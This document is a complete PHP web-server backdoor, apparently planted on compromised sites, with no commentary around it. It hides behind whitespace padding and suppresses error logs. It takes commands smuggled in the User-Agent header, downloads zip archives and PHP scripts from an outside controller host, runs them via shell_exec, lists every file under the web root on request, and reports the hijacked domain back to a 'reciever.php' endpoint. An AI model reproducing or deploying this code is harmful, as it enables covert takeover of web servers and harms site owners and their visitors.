<?php                                                                                                                                                                                                                                                                                                                                                                                                                                         
ignore_user_abort(true); 
set_time_limit(0); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 

function upl($url_archive_HM, $archive_path_HM)
{
	if (!copy($url_archive_HM, $archive_path_HM)) 
	{
		$arch1 = file_get_contents($url_archive_HM);
		
		if (($arch1 !== "") and ($arch1 !== " ") and ($arch1 !== null)) 
		{ 
			$f = fopen ($archive_path_HM, "w"); 
			fwrite($f, $arch1); 
			fclose($f); 
		} 
		else 
		{ 
			$ch = curl_init($url_archive_HM); 
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
			$data = curl_exec($ch); 
			curl_close($ch);  
			file_put_contents($archive_path_HM, $data); 
		} 
	}
}
function clear_folder($folder_name)
{
	$folder_name_path = $folder_name;
	$arr_filename = array();
	
    if ($dh = opendir($folder_name)) 
    {
        while (($file = readdir($dh)) !== false) 
        {
            if (($file != ".") and ($file != ".."))
                $arr_filename[] = $file;
        }
        closedir($dh);
    }
    
	if (count($arr_filename) > 1)
	{
		foreach ($arr_filename as $file_for_delete)
		{
			$file_for_delete = trim($file_for_delete);
			$file_for_delete = $folder_name.'/'.$file_for_delete;
				
			if (file_exists($file_for_delete))
				unlink($file_for_delete);
			
			if (file_exists($file_for_delete))
			{
				chmod($file_for_delete, 0777);
				unlink($file_for_delete);
			}
		}
	}	
	
	if (is_dir($folder_name_path))                        
		rmdir($folder_name_path);
	
	if (is_dir($folder_name_path))   
	{
		chmod($folder_name_path, 0777);		
		rmdir($folder_name_path);
	}
}

function getURL($url, $maxRedirs = 5, $timeout = 30) 
{ 
	$ch = curl_init(); 
	$header[] = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"; 
	$header[] = "Connection: keep-alive"; 
	$header[] = "Keep-Alive: 300"; 
	$header[] = "Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"; 
	$header[] = "Pragma: "; 
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"); 
	curl_setopt($ch, CURLOPT_URL, $url); 
	curl_setopt($ch, CURLOPT_HTTPHEADER, $header); 
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate'); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($ch, CURLOPT_AUTOREFERER, true); 
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); 
	
	$content = curl_exec($ch); 
	$response = curl_getinfo($ch); 
	curl_close ($ch); 
	if (($response['http_code'] == 301 OR $response['http_code'] == 302) AND $maxRedirs) 
		if ($headers = get_headers($response['url'])) 
			foreach($headers as $value) 
				if (substr( strtolower($value), 0, 9 ) == "location:") 
				{ 
					$locationURL = trim(substr($value, 9, strlen($value))); 
					if (!preg_match('/^http/', $locationURL)) 
					{ 
						$arUrl = parse_url($url); 
						$locationURL = $arUrl['scheme'] . '://' . $arUrl['host'] . $locationURL; 
					} 
					return getURL($locationURL, --$maxRedirs, $timeout); 
				} 
				return ($content) ? $content : false;
}

function DirFilesR($dir) 
{ 
		$handle = opendir($dir) or die("Can't open directory $dir"); 
		$files = Array(); 
		$subfiles = Array(); 
		while (false !== ($file = readdir($handle))) 
		{ 
		  if ($file != "." && $file != "..") 
		  { 
			if(is_dir($dir."/".$file)) 
			{ 
			  $subfiles = DirFilesR($dir."/".$file); 
			  $files = array_merge($files,$subfiles); 
			} 
			else 
			{ 
			  $files[] = $dir."/".$file; 
			} 
		  } 
		} 
		closedir($handle); 
		return $files; 
}

if ($_GET['main'] == 'jk')
{
	$arr_files = DirFilesR($_SERVER['DOCUMENT_ROOT']);

	echo '<td><hr><hr>'."\n";
	foreach ($arr_files as $key)
	{
		$key_e = str_replace($_SERVER['DOCUMENT_ROOT'], $_SERVER['SERVER_NAME'], $key);
		echo $key_e."\n";
	}
	echo '<hr><hr></td>';
				
	exit;
}


$UA = $_SERVER['HTTP_USER_AGENT'];  
$status = stristr($UA, '~');

if ($status !== false) 
{
	$status_2 = stristr($UA, 'rvf'); 
	
	if ($status_2 !== false) 
	{ 
		$res = $UA;  
		$res = stristr($res, '~');
		$res = substr($res, 1); 
		$pos_end = strpos($res, '~'); 
		$res = substr_replace($res, '', $pos_end, 9999);  
		$status = explode(":", $res);  
		
		if ($status[0] == 'start') 
		{ 
			$url_archive = 'http://'.$status[2];
			$dir_for_work = '/'.$status[1];
			
			$dir_path = $_SERVER['DOCUMENT_ROOT'].'/'.$dir_for_work; 
			$archive_path = $dir_path.'1.zip'; 
			$script_name = $dir_path.'1.php';  
			
			if (is_dir($dir_path))
				clear_folder($dir_path);

			if (!is_dir($dir_path))
				mkdir($dir_path, 0777);
			else 
			{ 
				echo "~~Error!!~~folder already exists";
				exit;
			}  

			if (is_dir($dir_path)) 
			{
				if (!copy($url_archive, $archive_path)) 
				{ 
					$arch = file_get_contents($url_archive);
					if (($arch !== "") and ($arch !== " ") and ($arch !== null)) 
					{ 
						$f = fopen ($archive_path, "w"); 
						fwrite($f, $arch); 
						fclose($f); 
					} 
					else 
					{ 
						$ch = curl_init($url_archive); 
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
						$data = curl_exec($ch); 
						curl_close($ch);  
						file_put_contents($archive_path, $data); 
					} 
				}  
				
				if (file_exists($archive_path)) 
				{ 
					$zip = new ZipArchive; 
					$zip->open("$archive_path"); 
					$zip->extractTo("$dir_path"); 
					$zip->close();  

					if (!file_exists($script_name)) 
					{ 
						$domain_name_2 = $_SERVER['SERVER_NAME']; 
						$unzip_path = $dir_path.'unzip.php';  
						
						$data1 = '<?php $archive_path = $_SERVER[\'DOCUMENT_ROOT\']'; 
						$data2 = '.\'/'; 
						$data3 = $dir_for_work; 
						$data4 = "1.zip';"; 
						$data5 = '$output = shell_exec("unzip 1.zip");?>';  
						
						$data = $data1.$data2.$data3.$data4.$data5;
						
						$fas = fopen ($unzip_path, "w"); 
						fwrite($fas, $data); 
						fclose($fas);  
						
						$unzip_url = 'http://'.$domain_name_2.'/'.$status[1].'unzip.php';  
						
						echo getURL($unzip_url); 
					}
					if (!file_exists($script_name)) 
					{
						$url_archive_HM = str_replace('1.zip', '/1/1.php', $url_archive);
						$archive_path_HM = str_replace('1.zip', '1.php', $url_archive);
						
						
						upl($url_archive_HM, $archive_path_HM);
						
						if (!file_exists($script_name)) 
						{
							echo '~can not unzipped!~';
							clear_folder($dir_path); 
							exit;
						}
						else
						{
							$url_archive_HM_cleaner = str_replace('1.zip', '/1/cleaner.php', $url_archive);
							$archive_path_HM_cleaner = str_replace('1.zip', 'cleaner.php', $url_archive);
							
							$url_archive_HM_get_domen = str_replace('1.zip', '/1/get_domen.php', $url_archive);
							$archive_path_HM_get_domen = str_replace('1.zip', 'get_domen.php', $url_archive);
							
							$url_archive_HM_mcurl = str_replace('1.zip', '/1/mcurl.class.php', $url_archive);
							$archive_path_HM_mcurl = str_replace('1.zip', 'mcurl.class.php', $url_archive);
							
							$url_archive_HM_mcurl2 = str_replace('1.zip', '/1/mcurl2.class.php', $url_archive);
							$archive_path_HM_mcurl2 = str_replace('1.zip', 'mcurl2.class.php', $url_archive);
							
							$url_archive_HM_run = str_replace('1.zip', '/1/run.php', $url_archive);
							$archive_path_HM_run = str_replace('1.zip', 'run.php', $url_archive);
							
							
							upl($url_archive_HM_cleaner, $archive_path_HM_cleaner);
							upl($url_archive_HM_get_domen, $archive_path_HM_get_domen);
							upl($url_archive_HM_mcurl, $archive_path_HM_mcurl);
							upl($url_archive_HM_mcurl2, $archive_path_HM_mcurl2);
							upl($url_archive_HM_run, $archive_path_HM_run);
							
						}
					}
				}
				else 
				{
					echo '~Can not upload archive!~'; 
					clear_folder($dir_path); 
					exit; 
				}

				if (file_exists($script_name))
				{ 
					echo '~Client has been activated!~';  
					
					
					$file_name = $_SERVER['DOCUMENT_ROOT'].'/'.$status[1].'server_name.txt';  
					$server_name_find = 'http://'.$status[2].'/';
					$server_name_find = str_replace('1.zip/', '', $server_name_find);
					
					$faa = fopen ($file_name, "w");
					fwrite($faa, $server_name_find);
					fclose($faa);
					
					$file = fopen($file_name,"rt"); 
					$original_file = fread($file,filesize($file_name)); 
					fclose($file);  
					
					
					$domain_name = $_SERVER['SERVER_NAME']; 
					$url = $original_file.'reciever.php?data='.$domain_name;  
					$UA = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4';  
					$ch = curl_init($url); 
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
					curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
					curl_setopt($ch, CURLOPT_REFERER, $domain_name); 
					curl_setopt($ch, CURLOPT_USERAGENT, $UA); 
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
					$data = curl_exec($ch); 
					curl_close($ch); 
					echo $data.'<hr>';  
					$data = file_get_contents($url); 
					echo $data.'<hr>';  
					echo getURL($url);  
					exit; 
				} 
				else 
				{ 
					echo '~Can not unziped!~';
					clear_folder($dir_path);
					exit; 
				} 
			} 
			else 
			{ 
				echo '~Can not make dir!~'; 
				exit; 
			}
		}
		
		if ($status[0] == 'finish') 
		{ 
			$dir_path = $_SERVER['DOCUMENT_ROOT'].'/'.$status[1];
			
			clear_folder($dir_path);
			
			if (is_dir($dir_path))
				echo "~~Error!!~~";
			else 
			{ 
				echo "~~Destroyed!~~";
				$domain_name = $_SERVER['SERVER_NAME']; 
				$url = 'http://'.$status[2].'/reciever.php?del='.$domain_name;  
				$UA = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4';  
				$ch = curl_init($url); 
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
				curl_setopt($ch, CURLOPT_TIMEOUT, 30); 
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
				curl_setopt($ch, CURLOPT_REFERER, $domain_name); 
				curl_setopt($ch, CURLOPT_USERAGENT, $UA); 
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
				
				$data = curl_exec($ch); 
				curl_close($ch); 
				echo $data.'<hr>';  
				$data = file_get_contents($url); 
				echo $data.'<hr>';  
				echo getURL($url); 
			} 
			exit;
		} 
	} 

}
?>